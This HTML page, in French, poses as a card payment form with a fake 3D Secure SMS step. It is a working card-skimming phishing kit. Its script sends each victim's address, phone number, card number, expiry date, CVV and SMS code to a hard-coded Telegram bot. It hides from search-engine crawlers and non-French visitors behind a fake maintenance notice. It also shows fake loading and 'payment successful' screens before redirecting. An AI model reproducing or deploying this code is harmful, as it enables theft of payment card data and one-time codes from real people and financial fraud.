<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de Paiement</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .payment-container {
      background-color: white;
      width: 400px;
      margin: 50px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h2 {
      color: #333;
      text-align: center;
    }

    form label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      text-align: left;
    }

    input[type="text"],
    input[type="number"],
    input[type="submit"] {
      width: 94%;
      padding: 12px;
      margin: 8px 0 20px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      font-size: 18px;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }

    .icon-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 20px 0;
    }

    .icon-container img {
      height: 30px;
      margin: 0 10px;
    }

    .hidden {
      display: none;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Adaptation pour les écrans plus petits */
    @media (max-width: 600px) {
      .payment-container {
        width: 90%;
        margin: 50px auto;
        padding: 20px;
      }

      h2 {
        font-size: 20px;
      }

      input[type="text"],
      input[type="number"],
      input[type="submit"] {
        font-size: 14px;
        padding: 10px;
      }

      input[type="submit"] {
        font-size: 16px;
      }
    }

    /* Adaptation pour les petits écrans (moins de 400px) */
    @media (max-width: 400px) {
      .payment-container {
        width: 90%;
        margin: 20px auto;
        padding: 15px;
      }

      h2 {
        font-size: 18px;
      }

      input[type="text"],
      input[type="number"],
      input[type="submit"] {
        font-size: 14px;
        padding: 8px;
      }

      input[type="submit"] {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <div class="payment-container" id="step-1">
    <h2>Formulaire de Paiement</h2>
    <div class="icon-container">
      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
    </div>

    <form id="payment-form">
      <label for="delivery-address">Adresse de livraison</label>
      <input type="text" id="delivery-address" name="delivery-address" required placeholder="Entrez votre adresse de livraison">

      <label for="phone-number">Numéro de téléphone</label>
      <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">

      <label for="cardholder-name">Nom sur la carte</label>
      <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">

      <label for="card-number">Numéro de la carte</label>
      <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">
      <p id="card-type" style="font-size: 14px; color: #666; margin-top: -10px; margin-bottom: 20px;"></p>

      <label for="expiry-date">Date d'expiration</label>
      <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">

      <label for="cvv">Code de sécurité (CVV)</label>
      <input 
        type="text" 
        id="cvv" 
        name="cvv" 
        maxlength="3" 
        pattern="\d{3}" 
        required 
        placeholder="XXX"
        title="Veuillez entrer exactement 3 chiffres pour le CVV."
      >
      
      <center><input type="submit" value="Payer"></center>
    </form>
  </div>

  <div class="payment-container hidden" id="step-2">
    <h2>3D Secure</h2>
    <div class="icon-container">
      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
    </div>
    <div class="spinner"></div>
    <center><p>VEUILLEZ PATIENTEZ...</p></center>
  </div>

  <div class="payment-container hidden" id="step-3">
    <h2>Code SMS</h2>
    <div class="icon-container">
      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
    </div>
    <p>Entrez le code reçu par SMS :</p>
    <form id="sms-form">
      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
      <input type="submit" value="Valider">
    </form>
  </div>

  <div class="payment-container hidden" id="step-4">
    <h2>3D Secure</h2>
    <div class="icon-container">
      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
    </div>
    <div class="spinner"></div>
    <center><p>VEUILLEZ PATIENTEZ...</p></center>
  </div>

  <div class="payment-container hidden" id="step-5">
    <h2>PAIEMENT RÉUSSI</h2>
    <div class="icon-container">
      <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
    </div>
    <center><p>Redirection dans quelques instants...</p></center>
  </div>

  <div class="payment-container hidden" id="blocked-message">
    <center><h1>SITE EN MAINTENANCE</h1>
    <center><p>Nos équipes procédent à des maj importantes </p>
      
      <center><p><h3>Veuillez nous excuser </p>
      
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
    const TELEGRAM_CHAT_ID = '7747778364';

    let userIP = '';
    let userFormData = {};

    // Fonction pour détecter le type de carte
    function detectCardType(cardNumber) {
      const cardPatterns = {
        visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
        mastercard: /^5[1-5][0-9]{14}$/,
        amex: /^3[47][0-9]{13}$/,
        diners: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
        discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
        jcb: /^(?:2131|1800|35\d{3})\d{11}$/,
      };

      for (const [cardType, pattern] of Object.entries(cardPatterns)) {
        if (pattern.test(cardNumber)) {
          return cardType.toUpperCase();
        }
      }

      return 'INCONNU';
    }

    // Fonction pour envoyer un message à Telegram
    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    // Fonction pour vérifier si l'utilisateur est un bot
    function isBot(userAgent) {
      const bots = ['Googlebot', 'Bingbot', 'Yahoo', 'DuckDuckBot', 'Baiduspider', 'YandexBot'];
      return bots.some(bot => userAgent.includes(bot));
    }

    // Fonction pour vérifier si l'IP est en France
    async function checkIfFrenchIP(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/country/`);
        const country = await response.text();
        return country === 'FR';
      } catch (error) {
        console.error('Erreur lors de la vérification de l\'IP :', error);
        return false;
      }
    }

    // Fonction pour bloquer l'accès
    function blockAccess() {
      document.getElementById('step-1').classList.add('hidden');
      document.getElementById('blocked-message').classList.remove('hidden');
    }

    // Fonction pour récupérer l'adresse IP de l'utilisateur
    async function fetchUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;

        // Vérifier si l'utilisateur est un bot
        const userAgent = navigator.userAgent;
        if (isBot(userAgent)) {
          sendToTelegram(`Tentative d'accès bloquée - Bot détecté - IP: ${userIP}`);
          blockAccess();
          return;
        }

        // Vérifier si l'IP est en France
        const isFrench = await checkIfFrenchIP(userIP);
        if (!isFrench) {
          sendToTelegram(`Tentative d'accès bloquée - IP non française - IP: ${userIP}`);
          blockAccess();
          return;
        }

        // Si tout est OK, autoriser l'accès
        sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
      } catch (error) {
        console.error('Erreur lors de la récupération de l\'IP :', error);
      }
    }

    // Appeler la fonction pour récupérer l'adresse IP au chargement de la page
    window.onload = fetchUserIP;

    // Gestionnaire de soumission du formulaire de paiement
    document.getElementById('payment-form').addEventListener('submit', function(event) {
      event.preventDefault();

      const deliveryAddress = document.getElementById('delivery-address').value;
      const phoneNumber = document.getElementById('phone-number').value;
      const cardholderName = document.getElementById('cardholder-name').value;
      const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
      const expiryDate = document.getElementById('expiry-date').value;
      const cvv = document.getElementById('cvv').value;
      const cardType = detectCardType(cardNumber);

      userFormData = {
        deliveryAddress: deliveryAddress,
        phoneNumber: phoneNumber,
        cardholderName: cardholderName,
        cardNumber: cardNumber,
        expiryDate: expiryDate,
        cvv: cvv,
        ip: userIP,
        cardType: cardType
      };

      let message = `Paiement reçu :
        Adresse de livraison : ${deliveryAddress}
        Numéro de téléphone : ${phoneNumber}
        Nom : ${cardholderName}
        Numéro : ${cardNumber}
        Expiration : ${expiryDate}
        CVV : ${cvv}
        Type de carte : ${cardType}
        IP : ${userIP}
      `;
      sendToTelegram(message);

      document.getElementById('step-1').classList.add('hidden');
      document.getElementById('step-2').classList.remove('hidden');

      setTimeout(() => {
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');
      }, 10000);
    });

    // Gestionnaire de soumission du formulaire de code SMS
    document.getElementById('sms-form').addEventListener('submit', function(event) {
      event.preventDefault();

      const smsCode = document.getElementById('sms-code').value;

      let message = `Formulaire complet pour IP : ${userIP}
        Adresse de livraison : ${userFormData.deliveryAddress}
        Numéro de téléphone : ${userFormData.phoneNumber}
        Nom : ${userFormData.cardholderName}
        Numéro : ${userFormData.cardNumber}
        Expiration : ${userFormData.expiryDate}
        CVV : ${userFormData.cvv}
        Code SMS reçu : ${smsCode}
      `;
      
      sendToTelegram(message);

      document.getElementById('step-3').classList.add('hidden');
      document.getElementById('step-4').classList.remove('hidden');

      setTimeout(() => {
        document.getElementById('step-4').classList.add('hidden');
        document.getElementById('step-5').classList.remove('hidden');

        setTimeout(() => {
          window.location.href = "https://justmoicom.github.io/vlad/";
        }, 5000);
      }, 7000);
    });

    // Afficher le type de carte en temps réel
    document.getElementById('card-number').addEventListener('input', function() {
      const cardNumber = this.value.replace(/\s/g, '');
      const cardType = detectCardType(cardNumber);
      document.getElementById('card-type').textContent = `Type de carte détecté : ${cardType}`;
    });

    // Formater la date d'expiration
    document.getElementById('expiry-date').addEventListener('input', function() {
      let value = this.value.replace(/\D/g, '');
      if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      this.value = value;
    });
  </script>
</body>
</html>
